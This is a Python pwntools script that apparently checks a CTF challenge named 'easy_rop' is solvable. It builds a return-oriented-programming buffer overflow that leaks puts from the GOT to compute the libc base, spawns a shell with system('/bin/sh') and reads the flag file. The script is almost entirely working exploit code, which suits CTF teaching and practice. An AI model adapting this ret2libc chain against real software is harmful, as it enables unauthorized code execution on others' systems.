#!/usr/bin/python3
from pwn import *
import time


def build_payload(addrs):
    payload = b''
    for i in addrs:
        if isinstance(i, bytes):
            payload += i
        elif isinstance(i, int):
            payload += p64(i)
        elif isinstance(i, str):
            payload += i.encode()

    return payload


def leak_bytes_as_str(address_to_leak):
    payload = build_payload([b'J'*32,
                             b'B'*8,
                             pop_rdi,
                             address_to_leak,
                             puts_plt,
                             vuln_addr,
                             b'\n'])

    p.send_raw(payload)
    time.sleep(2)
    waited_time = 0
    while p.can_read() is False:
        print("waiting")
        time.sleep(0.2)
        waited_time += 0.2
        if waited_time >= 30:
            # force the error
            print("forcing error due to timeout")
            print(p.read())

    # response = p.read()
    response = p.recvuntil("\n").strip()
    return response


binary = ELF('easy_rop')
# library = ELF('libc-2.27.so')
library = ELF('/usr/lib/libc.so.6')
brop = ROP(binary)

puts_offset = library.symbols['puts']
system_offset = library.symbols['system']
binsh_offset = library.data.find(b'/bin/sh')

print(f"puts offset: {hex(puts_offset)}")
print(f"system offset {hex(system_offset)}")
print(f"/bin/sh offset: {hex(binsh_offset)}")

puts_plt = binary.symbols['plt.puts']
vuln_addr = binary.symbols['vuln']
main_addr = binary.symbols['main']
got_puts = binary.symbols['got.puts']

print(f"plt.puts address: {hex(puts_plt)}")
print(f"got.puts address: {hex(got_puts)}")
print(f"vuln address: {hex(vuln_addr)}")


pop_rdi = [k for k, v in brop.gadgets.items() if v.insns == ['pop rdi', 'ret']][0]
ret = [k for k, v in brop.gadgets.items() if v.insns == ['ret']][0]

p = process(['./easy_rop'])
# p = remote("ctf.cyberatuc.org", 49063)

print(p.recvuntil("\n"))
puts_addr_unpadded = leak_bytes_as_str(got_puts)
print(f"leak: {puts_addr_unpadded}")
puts_addr = int.from_bytes(puts_addr_unpadded, 'little')
print(f"leaked puts address: {hex(puts_addr)}")
base = puts_addr - puts_offset
print(f"calculated libc base address: {hex(base)}")

payload = build_payload([b'J'*32,
                         b'B'*8,
                         pop_rdi,
                         base + binsh_offset,
                         base + system_offset,
                         vuln_addr])

p.sendline(payload)
# p.interactive()
time.sleep(2)
p.send_raw(b'cat ./flag.txt\n')
time.sleep(0.2)
flag = p.read().decode().strip()
print(f"flag: {flag}")
with open("flag.txt", "r") as f:
    checkflag = f.read().strip()
assert(flag.find(checkflag) != -1)
print("flag check passed, challenge is solvable")


